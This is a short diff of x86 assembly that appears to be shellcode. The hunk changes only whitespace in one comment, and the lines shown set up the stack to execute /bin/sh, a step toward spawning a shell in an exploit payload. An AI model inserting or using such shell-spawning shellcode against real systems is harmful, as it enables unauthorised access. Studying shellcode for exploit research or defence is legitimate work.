@@ -77,7 +77,7 @@ loop:
 
 	; Execute /bin/sh
 
-	push edx			; NULL
+	push edx		; NULL
 	push 0x68732f2f		; "hs//"
 	push 0x6e69622f 	; "nib/"
 	mov ebx, esp		; point ebx to stack
